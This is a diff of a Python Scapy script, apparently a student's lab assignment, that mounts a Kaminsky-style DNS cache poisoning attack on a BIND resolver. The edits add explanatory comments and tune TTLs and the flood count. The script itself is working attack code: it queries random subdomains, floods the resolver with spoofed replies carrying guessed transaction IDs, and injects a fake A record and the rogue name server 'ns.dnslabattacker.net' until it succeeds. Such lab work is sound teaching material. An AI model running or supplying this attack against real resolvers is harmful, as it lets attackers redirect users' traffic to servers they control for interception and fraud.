@@ -11,7 +11,7 @@ from subprocess import call
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
 parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
-parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
+parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False) # not needed as per Piazza
 parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
 args = parser.parse_args()
 
@@ -68,7 +68,7 @@ def sendDNSQuery(sock, query):
 """
 def sendFakeReplies(query):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    spoofReply = DNS(
+    spoofReply = DNS( # spoofed DNS packet, i.e. fake record
         qr=1,
         opcode=0,
         aa=1,
@@ -78,13 +78,14 @@ def sendFakeReplies(query):
         z=0,
         qd=DNSQR(qname=query, qtype="A"),
         # answer with fraudulent ip (exp. rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151')
-        an=DNSRR(rrname=query, type="A", rclass="IN", ttl=3600, rdata="1.2.3.4"),
+        an=DNSRR(rrname=query, type="A", rclass="IN", ttl=3600, rdata="1.2.3.4"), # use large TTL
         # provide the fraudulent name server
-        ns=DNSRR(rrname=request_domain, type="NS", rdata="ns.dnslabattacker.net")
+        ns=DNSRR(rrname=request_domain, type="NS", ttl=3600, rdata="ns.dnslabattacker.net") # should need TTL I think
+        # ns=DNSRR(rrname=request_domain, type="NS", rdata="ns.dnslabattacker.net") # should need TTL I think
     )
     print('Sending fake responses ...')
-    for i in range(100):
-        spoofReply[DNS].id = getRandomTXID()
+    for i in range(50):
+        spoofReply[DNS].id = getRandomTXID() # TODO: you might repeat TXID?
         sendPacket(sock, spoofReply, my_ip, my_query_port) # flood listening port
     return
 
@@ -92,9 +93,9 @@ if __name__ == '__main__':
     while True:
         query = getRandomSubDomain() + '.' + request_domain
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-        sendDNSQuery(sock, query)
+        sendDNSQuery(sock, query) # Step 1: send DNS query to name server (since mapping not in cache)
         
-        sendFakeReplies(query)
+        sendFakeReplies(query) # Step 2: flood BIND with stream of spoofed DNS replies
 
         print('Check for response from BIND')
         response = sock.recv(4096)
@@ -102,3 +103,4 @@ if __name__ == '__main__':
         if response[DNS].ns and response[DNS].ns.rdata == 'ns.dnslabattacker.net': # maybe use rcode for success/failure
             print("Success")
             break
+# You should not ask the NS of example.com before you succeed in your attack
